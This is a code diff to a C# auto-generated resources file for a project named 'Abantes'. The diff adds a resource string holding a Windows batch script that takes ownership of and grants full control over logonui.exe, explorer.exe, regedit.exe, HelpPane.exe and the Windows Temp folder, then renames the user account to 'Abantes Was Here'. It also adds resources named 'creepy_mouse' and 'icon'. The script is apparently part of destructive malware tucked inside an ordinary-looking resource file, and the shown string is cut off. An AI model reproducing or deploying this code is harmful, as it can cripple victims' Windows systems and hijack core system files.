@@ -61,11 +61,45 @@ namespace Abantes.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to .
+        ///   Looks up a localized string similar to @echo on
+        ///cd\&amp;cd Windows\System32
+        ///takeown /f logonui.exe
+        ///icacls logonui.exe /granted %username%:F
+        ///cd\&amp;cd Windows
+        ///takeown /f explorer.exe
+        ///takeown /f regedit.exe
+        ///takeown /f HelpPane.exe
+        ///takeown /f &quot;C:\Windows\Temp&quot; /r /d y
+        ///icacls &quot;C:\Windows\Temp&quot; /granted %username%:F /T /C
+        ///icacls regedit.exe /granted %username%:F
+        ///icacls explorer.exe /granted %username%:F
+        ///icacls HelpPane.exe /granted %username%:F
+        ///wmic useraccount where name=&apos;%username%&apos; set FullName=&apos;Abantes Was Here&apos;
+        ///wmic useraccount where name [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Action {
             get {
                 return ResourceManager.GetString("Action", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] creepy_mouse {
+            get {
+                object obj = ResourceManager.GetObject("creepy_mouse", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] icon {
+            get {
+                object obj = ResourceManager.GetObject("icon", resourceCulture);
+                return ((byte[])(obj));
             }
         }
         
